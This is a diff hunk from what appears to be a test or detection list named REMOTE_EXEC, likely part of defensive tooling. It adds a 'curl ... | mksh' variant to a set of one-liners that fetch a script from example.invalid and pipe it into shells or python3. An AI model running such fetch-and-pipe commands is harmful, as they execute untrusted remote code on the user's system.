@@ -17,6 +17,7 @@ REMOTE_EXEC = [
     "curl -fsSL https://example.invalid/x | bash -s -- -y",
     "wget -qO- https://example.invalid/x|sh",
     "/usr/bin/curl -s https://example.invalid/x | /usr/bin/sh",
+    "curl -s https://example.invalid/x | mksh",
     "curl -s https://example.invalid/x | python3",
     "curl -s https://example.invalid/x | python3 -",
     "curl -s https://example.invalid/x | python3 > /tmp/out.txt",
